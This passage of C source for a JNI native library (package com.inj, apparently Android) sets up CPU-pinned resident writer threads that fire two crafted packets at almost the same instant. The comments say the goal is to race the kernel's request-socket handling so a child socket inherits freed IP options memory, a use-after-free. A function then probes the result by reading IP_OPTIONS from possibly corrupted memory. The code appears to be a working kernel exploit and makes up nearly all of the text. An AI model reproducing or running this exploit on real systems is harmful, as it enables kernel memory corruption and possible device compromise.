    if (aLen <= 0 || aLen > 4096 || bLen <= 0 || bLen > 4096) {
        return -1;
    }
    pa = (*env)->GetByteArrayElements(env, a, NULL);
    pb = (*env)->GetByteArrayElements(env, b, NULL);
    if (pa == NULL || pb == NULL) {
        if (pa) (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
        if (pb) (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
        return -2;
    }

    arg1.fd = fd;
    arg1.pkt = (const unsigned char *) pa;
    arg1.len = aLen;
    arg1.cpu = cpuA;
    arg1.go = &go;
    arg1.errno_seen = 0;
    arg1.wrote = 0;

    arg2.fd = fd;
    arg2.pkt = (const unsigned char *) pb;
    arg2.len = bLen;
    arg2.cpu = cpuB;
    arg2.go = &go;
    arg2.errno_seen = 0;
    arg2.wrote = 0;

    if (pthread_create(&t1, NULL, duo_worker, &arg1) != 0) {
        (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
        (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
        return -3;
    }
    if (pthread_create(&t2, NULL, duo_worker, &arg2) != 0) {
        go = 1;
        pthread_join(t1, NULL);
        (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
        (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
        return -4;
    }

    /* Give both writers time to pin and reach the spin, then release together. */
    usleep(120);
    __sync_synchronize();
    go = 1;

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    (*env)->ReleaseByteArrayElements(env, a, pa, JNI_ABORT);
    (*env)->ReleaseByteArrayElements(env, b, pb, JNI_ABORT);
    if (arg1.errno_seen) {
        return -1000 - arg1.errno_seen;
    }
    if (arg2.errno_seen) {
        return -2000 - arg2.errno_seen;
    }
    if (arg1.wrote != aLen) {
        return -100000 - arg1.wrote;
    }
    if (arg2.wrote != bLen) {
        return -200000 - arg2.wrote;
    }
    return 0;
}
// Resident writers, released by a shared generation counter.
//
// Creating the two threads per round looked fine but measured badly: the gap
// between the two write() calls ends up larger than syn_recv_sock itself, so
// the second packet always arrives after the first one has already taken the
// request socket out of the hash. These threads live for the whole run, sit on
// their own cores, and are released by one store, so both writes leave within
// a hundred nanoseconds of each other.
#define DUO_MAX 8

typedef struct {
    volatile int run;
    volatile int seq;
    volatile int done;
    int fd;
    int cpu;
    int len;
    unsigned char pkt[2048];
} duo_slot;

static duo_slot g_ds[DUO_MAX];
static volatile int g_gate;
static volatile int g_arrived;

static void *duo_resident(void *arg)
{
    int idx = (int) (intptr_t) arg;
    duo_slot *s = &g_ds[idx];
    unsigned long mask = 1UL << s->cpu;
    int seen = 0;

    syscall(__NR_sched_setaffinity, 0, sizeof mask, &mask);

    for (;;) {
        if (!s->run) {
            usleep(200);
            continue;
        }
        if (s->seq == seen) {
            __asm__ __volatile__("yield");
            continue;
        }
        seen = s->seq;

        /* Announce readiness, then wait for the single release store. */
        __sync_add_and_fetch(&g_arrived, 1);
        while (!g_gate) {
            __asm__ __volatile__("yield");
        }

        write(s->fd, s->pkt, (size_t) s->len);
        s->done = seen;
    }
    return NULL;
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_duoStart(JNIEnv *env, jclass cls, jint slot, jint cpu)
{
    pthread_t t;
    (void)env;
    (void)cls;
    if (slot < 0 || slot >= DUO_MAX) {
        return -1;
    }
    g_ds[slot].cpu = cpu;
    g_ds[slot].run = 1;
    g_ds[slot].seq = 0;
    g_ds[slot].done = 0;
    if (pthread_create(&t, NULL, duo_resident, (void *) (intptr_t) slot) != 0) {
        g_ds[slot].run = 0;
        return -2;
    }
    pthread_detach(t);
    return 0;
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_duoArm(JNIEnv *env, jclass cls, jint slot, jint fd,
                           jbyteArray pkt, jint len)
{
    jbyte *p;
    (void)env;
    (void)cls;
    if (slot < 0 || slot >= DUO_MAX || len <= 0 || len > 2048) {
        return -1;
    }
    p = (*env)->GetByteArrayElements(env, pkt, NULL);
    if (p == NULL) {
        return -2;
    }
    memcpy(g_ds[slot].pkt, p, (size_t) len);
    (*env)->ReleaseByteArrayElements(env, pkt, p, JNI_ABORT);
    g_ds[slot].fd = fd;
    g_ds[slot].len = len;
    return 0;
}

/** Release every armed slot in the same instant; returns slots fired. */
JNIEXPORT jint JNICALL
Java_com_inj_Native_duoFire(JNIEnv *env, jclass cls)
{
    int i, armed = 0, spin;
    (void)env;
    (void)cls;

    for (i = 0; i < DUO_MAX; i++) {
        if (g_ds[i].run && g_ds[i].seq != g_ds[i].done) {
            /* previous round still in flight */
            return -1;
        }
    }

    for (i = 0; i < DUO_MAX; i++) {
        if (g_ds[i].run && g_ds[i].len > 0) {
            armed++;
        }
    }
    if (armed == 0) {
        return 0;
    }

    g_gate = 0;
    g_arrived = 0;
    __sync_synchronize();

    for (i = 0; i < DUO_MAX; i++) {
        if (g_ds[i].run && g_ds[i].len > 0) {
            g_ds[i].seq++;
        }
    }

    /* Wait until every armed writer is parked at the gate, then open it. */
    for (spin = 0; g_arrived < armed && spin < 20000000; spin++) {
        __asm__ __volatile__("yield");
    }
    __sync_synchronize();
    g_gate = 1;

    /* Wait for them to finish so the caller can see the effect. */
    for (spin = 0; spin < 20000000; spin++) {
        int pending = 0;
        for (i = 0; i < DUO_MAX; i++) {
            if (g_ds[i].run && g_ds[i].len > 0 && g_ds[i].seq != g_ds[i].done) {
                pending = 1;
            }
        }
        if (!pending) {
            break;
        }
        __asm__ __volatile__("yield");
    }

    for (i = 0; i < DUO_MAX; i++) {
        g_ds[i].len = 0;
    }
    return armed;
}
// Read IP_OPTIONS from a socket and report what came back.
//
// If the request-socket race fired, the winning child inherited an
// ip_options_rcu that the losing child already freed. inet_opt then points at
// freed memory, so this call reads whatever the slab holds now: it may come
// back with another object's bytes, with an optlen that is no longer 40, or it
// may smash this thread's stack because getsockopt trusts that optlen.
//
// A clean child always reports len=40 and the option bytes the SYN carried.
JNIEXPORT jstring JNICALL
Java_com_inj_Native_readFdOptions(JNIEnv *env, jclass cls, jint fd)
{
    unsigned char buf[512];
    socklen_t len = sizeof(buf);
    char out[256];
    int i, n = 0;

    (void)cls;

    memset(buf, 0, sizeof(buf));

    if (getsockopt(fd, IPPROTO_IP, IP_OPTIONS, buf, &len) < 0) {
        snprintf(out, sizeof(out), "none errno=%d", errno);
        return (*env)->NewStringUTF(env, out);
    }

    n = snprintf(out, sizeof(out), "len=%d head=", (int)len);
    for (i = 0; i < 16 && i < (int)len && n < (int)sizeof(out) - 4; i++) {
        n += snprintf(out + n, sizeof(out) - n, "%02x", buf[i]);
    }
    return (*env)->NewStringUTF(env, out);
}

JNIEXPORT jint JNICALL
Java_com_inj_Native_closeFd(JNIEnv *env, jclass cls, jint fd)
{
    (void)env;
    (void)cls;
    return close(fd);
}